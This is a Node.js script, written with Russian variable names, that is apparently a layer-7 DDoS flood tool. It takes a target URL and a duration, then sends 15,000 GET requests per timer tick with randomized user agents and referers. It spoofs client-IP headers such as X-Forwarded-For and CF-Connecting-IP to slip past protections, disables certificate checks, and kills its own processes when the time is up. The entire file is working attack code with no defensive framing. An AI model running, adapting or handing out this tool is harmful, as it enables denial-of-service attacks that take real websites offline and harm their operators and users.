const fs = require('fs');
const https = require('https');
const http = require('http');
const { exec } = require('child_process');
const dns = require('dns');
const url = require('url');

const цель = process.argv[2];
const длительность = parseInt(process.argv[3]) * 1000;
const юзерАгенты = fs.readFileSync('uagent.txt', 'utf-8').split('\n').filter(Boolean);
const прокси = fs.existsSync('prox.txt') ? fs.readFileSync('prox.txt', 'utf-8').split('\n').filter(Boolean) : [];
const потоки = 15000;

const случайныйIP = () => Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
const выбратьUA = () => юзерАгенты[Math.floor(Math.random() * юзерАгенты.length)];
const выбратьПрокси = () => прокси.length > 0 ? прокси[Math.floor(Math.random() * прокси.length)] : null;
const случайныйРеф = () => {
  const лист = [
    'https://google.com',
    'https://bing.com',
    'https://yandex.com',
    'https://duckduckgo.com',
    'https://github.com',
    'https://youtube.com',
    'https://t.co',
    'https://linkedin.com',
    'https://vk.com'
  ];
  return лист[Math.floor(Math.random() * лист.length)];
};

const уничтожить = () => {
  console.log('\n[!] УНИЧТОЖАЕМ ВСЁ ');
  exec(`ps -ef | grep "node a.js" | grep -v grep | awk '{print $2}' | xargs -r kill -9`, (err) => {
    if (err) console.error('Ошибка убийства:', err);
    process.exit();
  });
};

const фейкTLS = () => {
  const протокол = цель.startsWith('https') ? https : http;
  const parsedURL = url.parse(цель);

  dns.lookup(parsedURL.hostname, (err, ip) => {
    if (err || !ip) return;
    const ipПодделка = случайныйIP();
    const заголовки = {
      'Host': parsedURL.hostname,
      'User-Agent': выбратьUA(),
      'X-Forwarded-For': ipПодделка,
      'X-Real-IP': ipПодделка,
      'CF-Connecting-IP': ipПодделка,
      'True-Client-IP': ipПодделка,
      'Referer': случайныйРеф(),
      'Accept': '*/*',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
      'DNT': '1',
      'Upgrade-Insecure-Requests': '1',
      'Connection': 'keep-alive',
      'TE': 'trailers'
    };

    const опции = {
      hostname: ip,
      port: parsedURL.port || (цель.startsWith('https') ? 443 : 80),
      path: parsedURL.path || '/',
      method: 'GET',
      headers: заголовки,
      servername: parsedURL.hostname,
      rejectUnauthorized: false
    };

    const req = протокол.request(опции, () => {});
    req.on('error', () => {});
    req.end();
  });
};

const начатьАтаку = () => {
  console.log(`[!] НАЧИНАЕМ СУПЕР СТЕЛС АТАКУ -> ${цель} НА ${длительность / 1000} секунд 🚀`);

  const атака = setInterval(() => {
    for (let i = 0; i < потоки; i++) {
      фейкTLS();
    }
  }, 0);

  setTimeout(() => {
    clearInterval(атака);
    setTimeout(() => уничтожить(), 100); 
  }, длительность);
};

setTimeout(() => {
  console.log('[+] SIGKILLER STANDBY');
  exec(`ps -ef | grep "node a.js" | grep -v grep | awk '{print $2}' | xargs -r kill -9`, () => {});
}, длительность + 1000);

process.on('SIGINT', () => {
  console.log('[CTRL+C] Обнаружено. Завершаем...');
  уничтожить();
});

if (!цель || !длительность) {
  console.log('Использование: node a.js <ссылка> <длительность_в_секундах>');
  process.exit();
} else {
  начатьАтаку();
}
